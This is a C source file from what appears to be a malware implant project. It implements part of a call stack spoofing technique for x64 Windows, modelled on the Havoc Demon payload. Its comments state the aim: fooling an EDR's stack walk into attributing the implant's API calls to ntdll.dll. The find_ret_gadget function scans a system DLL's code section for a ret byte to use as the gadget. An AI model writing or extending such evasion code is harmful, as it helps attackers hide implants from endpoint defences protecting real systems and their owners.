/*
 * spoofcall.c — Call stack spoofing for x64 Windows.
 * Reference: Havoc/HellsGate payload/Demon/src/asm/Spoof.x64.asm
 *
 * Technique:
 * 1. Scan a legitimate system DLL (e.g. ntdll.dll) for a ret gadget (0xC3)
 * 2. When calling a target API, build a fake stack frame so that the
 *    EDR's stack walk sees the call originate from the DLL instead of
 *    the implant's memory.
 *
 * Build: CGO automatically compiles this file + spoofcall_asm.S on
 *        Windows x64 via MinGW-w64.
 */

#if defined(_WIN64) && defined(__GNUC__)

#include <windows.h>
#include "../crt/pe.h"

/* Cached ret gadget per module — simple linear search, cache first hit. */
static unsigned long long g_ntdll_ret = 0;

/*
 * find_ret_gadget — Scan .text section of a loaded system DLL for ret (0xC3).
 * moduleName: UTF-8 string like "ntdll.dll" or "kernel32.dll".
 *
 * Returns: absolute address of the first ret instruction found, or 0 on failure.
 */
unsigned long long find_ret_gadget(const char* moduleName) {
    /* Convert UTF-8 module name to wchar_t */
    wchar_t wName[260];
    MultiByteToWideChar(CP_UTF8, 0, moduleName, -1, wName, 260);

    HMODULE mod = GetModuleHandleW(wName);
    if (!mod) {
        mod = LoadLibraryW(wName);
        if (!mod) return 0;
    }

    unsigned char* base = (unsigned char*)mod;
    unsigned int textRVA, textSize;
    if (pe_find_section(base, ".text", &textRVA, &textSize) != 0) return 0;

    if (!textRVA || !textSize) return 0;

    unsigned char* textStart = base + textRVA;
    for (unsigned int i = 0; i < textSize; i++) {
        if (textStart[i] == 0xC3) {
            /* Avoid ret inside a longer instruction — check that
               the preceding byte is NOT a REX prefix (0x40-0x4F) */
            if (i > 0) {
                unsigned char prev = textStart[i - 1];
                if (prev >= 0x40 && prev <= 0x4F) continue;
            }
            return (unsigned long long)(textStart + i);
        }
    }

    return 0;
}

#else

unsigned long long find_ret_gadget(const char* moduleName) {
    (void)moduleName;
    return 0;
}

#endif
